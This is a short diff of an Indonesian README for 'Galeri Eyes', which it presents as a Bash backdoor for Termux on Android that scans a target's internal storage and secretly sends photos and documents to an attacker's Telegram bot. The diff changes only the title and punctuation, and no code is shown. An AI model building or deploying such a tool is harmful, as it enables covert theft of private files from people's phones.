@@ -1,5 +1,5 @@
 
-# Galeri Eyes - Telegram Backdoor Script
+# Galeri Eyes
 
 **Galeri Eyes** adalah script backdoor berbasis Bash yang berjalan di Termux Android. Fungsinya untuk mengumpulkan file (terutama *foto dan dokumen*) dari penyimpanan internal target, lalu mengirimkannya secara diam-diam ke bot Telegram milik attacker.
 
@@ -12,8 +12,8 @@
 ## Cara Kerja
 
 1. Script dijalankan di Termux pada perangkat target.
-2. Script akan meminta akses storage dan setup tools yang dibutuhkan (`curl`, `jq`, `neofetch`).
-3. Scan semua file dari `/storage/emulated/0/`.
+2. Script akan meminta akses storage dan setup tools yang dibutuhkan (`curl`, `jq`, `neofetch`)
+3. Scan semua file dari `/storage/emulated/0/`
 
 ## Instalasi & Penggunaan
 
